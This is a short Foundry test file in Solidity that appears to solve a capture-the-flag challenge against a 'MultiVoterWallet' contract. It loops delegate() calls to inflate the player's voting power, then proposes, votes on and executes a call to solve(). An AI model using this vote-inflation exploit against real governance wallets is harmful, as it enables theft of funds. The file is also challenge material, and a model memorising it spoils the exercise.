// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {Test} from "forge-std/Test.sol";
import {Setup} from "../src/Setup3.sol";
import {MultiVoterWallet} from "../src/MultiVoterWallet.sol";
import {console} from "forge-std/console.sol";

contract MultiVoterTest is Test {
    Setup public chal;
    MultiVoterWallet public wallet;
    address public player = makeAddr("player");

    function setUp() public {
        chal = new Setup(player);
        wallet = chal.wallet();
        vm.startPrank(player);
    }

    function testProposalAndDelegate() public {
        for (uint i = 0; i < 100; i++) {
            wallet.delegate(address(0x1));
            wallet.delegate(address(chal));
            wallet.delegate(player);
        }
        wallet.propose(address(chal), abi.encodeWithSignature("solve()"));
        wallet.vote();
        wallet.execute();
        assert(chal.isSolved());
    }
}
